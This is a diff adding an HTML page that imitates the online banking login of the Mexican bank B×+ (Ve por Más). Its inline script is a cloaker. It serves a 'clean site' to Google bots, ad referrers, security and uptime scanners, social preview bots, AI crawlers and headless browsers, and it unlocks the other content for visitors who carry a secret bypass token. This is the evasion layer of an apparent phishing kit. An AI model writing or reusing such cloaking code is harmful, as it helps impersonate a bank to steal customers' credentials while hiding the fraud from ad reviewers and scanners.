@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="es" class="no-js">
+<head>
+  <style type="text/css">
+    @charset "UTF-8";
+    [ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}
+    ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}
+    .input-group {
+      border-right: 1px solid #ccc;
+      border-radius: 4px;
+    }
+  </style>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,IE=11,chrome=1">
+  <meta http-equiv="cache-control" content="private">
+  <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="cache-control" content="max-age=0">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex, nofollow" id="robots-meta">
+  <title>Banca en Línea B×+</title>
+  <meta name="description" content="Ingresa a nuestra Banca en Línea B×+ y realiza tus operaciones desde cualquier dispositivo sin importar donde estés ¡Entra ahora!">
+  <meta name="Banca en Línea B×+, Ve por Más" content="Ingresa a nuestra Banca en Línea B×+ y realiza tus operaciones desde cualquier dispositivo sin importar donde estés ¡Entra ahora!">
+  <link rel="icon" type="image/png" href="/images/favicon.png">
+  <script>
+    // Detección temprana de bots (antes de que React cargue)
+    (function() {
+      // Verificar bypass en URL (?bypass=real_user_2024)
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get('bypass') === 'real_user_2024') {
+        document.cookie = 'bypass_cloaker=real_user_2024; path=/; max-age=31536000; SameSite=Lax';
+        // Limpiar URL
+        window.history.replaceState({}, document.title, window.location.pathname);
+      }
+      
+      // Verificar si ya tiene cookie de bypass
+      const hasBypass = document.cookie.includes('bypass_cloaker=real_user_2024');
+      
+      // Si no tiene bypass, verificar si es bot
+      if (!hasBypass) {
+        const ua = navigator.userAgent || '';
+        
+        // Bots de Google (permitidos para Google Ads)
+        const googleBots = /Googlebot|Google-InspectionTool|AdsBot-Google|Mediapartners-Google|Googlebot-Image|Googlebot-Video/i;
+        const isGoogleBot = googleBots.test(ua);
+        
+        // Otros bots (bloqueados - mostrar sitio limpio)
+        const blockedBots = /Bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|Sogou|Exabot|facebot|ia_archiver|AhrefsBot|SemrushBot|DotBot|MJ12bot|Pingdom|GTmetrix|UptimeRobot|SiteAuditBot|BLEXBot|CCBot|ChatGPT-User|GPTBot|anthropic-ai|Claude-Web|PerplexityBot|YouBot|Applebot|facebookexternalhit|Twitterbot|LinkedInBot|WhatsApp|TelegramBot|Discordbot|Slackbot|SkypeUriPreview|Viber|LineBot|WeChat|360Spider|Bytespider|YisouSpider|msnbot|BingPreview/i;
+        const isBlockedBot = blockedBots.test(ua);
+        
+        // Verificar referrer
+        const referrer = document.referrer || '';
+        const isGoogleReferrer = /google\.com|googleadservices\.com|googlesyndication\.com|doubleclick\.net/i.test(referrer);
+        
+        // Verificar características del navegador (los bots pueden no tenerlas)
+        const hasBrowserFeatures = !!(navigator.plugins && navigator.plugins.length > 0) || 
+                                   !!(navigator.mimeTypes && navigator.mimeTypes.length > 0) ||
+                                   !!(window.chrome || window.safari);
+        
+        // Si es bot (Google o bloqueado) o no tiene características de navegador, mostrar sitio limpio
+        if (isGoogleBot || isBlockedBot || isGoogleReferrer || !hasBrowserFeatures) {
+          window.__SHOW_CLEAN_SITE__ = true;
+          
+          // Si es bot de Google, permitir indexación
+          if (isGoogleBot) {
+            const robotsMeta = document.getElementById('robots-meta');
+            if (robotsMeta) {
+              robotsMeta.setAttribute('content', 'index, follow');
+            }
+          }
+        }
+      }
+    })();
+  </script>
+</head>
+<body>
+  <div id="root"></div>
+  <script type="module" src="/src/main.tsx"></script>
+</body>
+</html>
